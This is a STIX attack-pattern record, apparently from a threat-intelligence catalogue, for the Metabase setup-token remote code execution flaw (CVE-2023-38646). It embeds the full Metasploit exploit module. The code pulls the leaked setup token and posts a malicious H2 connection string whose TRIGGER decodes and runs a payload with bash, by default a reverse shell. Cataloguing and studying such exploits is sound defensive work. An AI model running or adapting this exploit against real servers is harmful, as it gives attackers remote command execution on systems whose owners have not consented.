{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--068707f0-e409-4904-b386-6080c1272742",
    "created": "2024-08-14T17:04:24.435113Z",
    "modified": "2024-08-14T17:04:24.435117Z",
    "name": "Metabase Setup Token RCE",
    "description": " Metabase versions before 0.46.6.1 contain a flaw where the secret setup-token is accessible even after the setup process has been completed. With this token a user is able to submit the setup functionality to create a new database. When creating a new database, an H2 database string is created with a TRIGGER that allows for code execution. We use a sample database for our connection string to prevent corrupting real databases.  Successfully tested against Metabase 0.46.6.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/metabase_setup_token_rce.rb",
            "external_id": "metabase_setup_token_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/"
        },
        {
            "source_name": "reference",
            "url": "https://www.metabase.com/blog/security-advisory"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-38646"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Metabase Setup Token RCE',\n        'Description' => %q{\n          Metabase versions before 0.46.6.1 contain a flaw where the secret setup-token\n          is accessible even after the setup process has been completed. With this token\n          a user is able to submit the setup functionality to create a new database.\n          When creating a new database, an H2 database string is created with a TRIGGER\n          that allows for code execution. We use a sample database for our connection\n          string to prevent corrupting real databases.\n\n          Successfully tested against Metabase 0.46.6.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Maxwell Garrett', # original PoC, analysis\n          'Shubham Shah' # original PoC, analysis\n        ],\n        'References' => [\n          ['URL', 'https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/'],\n          ['URL', 'https://www.metabase.com/blog/security-advisory'],\n          ['CVE', '2023-38646']\n        ],\n        'Platform' => ['unix'],\n        'Privileged' => false,\n        'Arch' => ARCH_CMD,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_bash'\n          # for docker payload/cmd/unix/reverse_netcat also works, but no perl/python\n        },\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2023-07-22',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(3000),\n        OptString.new('TARGETURI', [ true, 'The URI of the Metabase Application', '/'])\n      ]\n    )\n  end\n\n  def get_bootstrap_json_blob_from_html_resp(html)\n    %r{<script type=\"application/json\" id=\"_metabaseBootstrap\">([^>]+)</script>} =~ html\n    begin\n      JSON.parse(Regexp.last_match(1))\n    rescue JSON::ParserError, TypeError\n      print_bad('Unable to parse JSON blob')\n      nil\n    end\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET'\n    )\n\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    json = get_bootstrap_json_blob_from_html_resp(res.body)\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response, unable to load JSON blob\") if json.nil?\n    version = json.dig('version', 'tag')\n    return CheckCode::Unknown(\"#{peer} - Unable to determine version from JSON blob\") if version.nil?\n\n    # typically v0.46.6\n    version = version.gsub('v', '')\n\n    if Rex::Version.new(version) < Rex::Version.new('0.46.6.1')\n      return CheckCode::Appears(\"Version Detected: #{version}\")\n    end\n\n    CheckCode::Safe(\"Version not vulnerable: #{version}\")\n  end\n\n  def exploit\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET'\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\") unless res.code == 200\n    json = get_bootstrap_json_blob_from_html_resp(res.body)\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response, unable to load JSON blob\") if json.nil?\n    setup_token = json['setup-token']\n    if setup_token.nil?\n      print_status('Setup token is nil, checking secondary location')\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'api', 'session', 'properties'),\n        'method' => 'GET'\n      )\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\") if res.nil?\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response (response code: #{res.code})\") unless res.code == 200\n      json = res.get_json_document\n      setup_token = json['setup-token']\n    end\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to find valid setup-token\") if setup_token.nil?\n    print_good(\"Found setup token: #{setup_token}\")\n\n    print_status('Sending exploit (may take a few seconds)')\n    # our base64ed payload can't have = in it, so we'll pad out with spaces to remove them\n    b64_pe = ::Base64.strict_encode64(payload.encoded)\n    equals_count = b64_pe.count('=')\n    if equals_count > 0\n      b64_pe = ::Base64.strict_encode64(payload.encoded + ' ' * equals_count)\n    end\n\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'setup', 'validate'),\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => {\n        'token' => setup_token,\n        'details' =>\n          {\n            # 'is_on_demand' => false, # without this, the shell takes ~20 sec longer to get\n            # 'is_full_sync' => false,\n            # 'is_sample' => false,\n            # 'cache_ttl' => nil,\n            # 'refingerprint' => false,\n            # 'auto_run_queries' => true,\n            # 'schedules' => {},\n            'details' =>\n              {\n                'db' => \"zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\\\;CREATE TRIGGER #{Rex::Text.rand_text_alpha_upper(6..12)} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec('bash -c {echo,#{b64_pe}}|{base64,-d}|{bash,-i}')\\n$$--=x\",\n                'advanced-options' => false,\n                'ssl' => true\n              },\n            'name' => Rex::Text.rand_text_alphanumeric(6..12),\n            'engine' => 'h2'\n          }\n      }.to_json\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-07-22",
    "x_mitre_platforms": [
        "['unix']"
    ]
}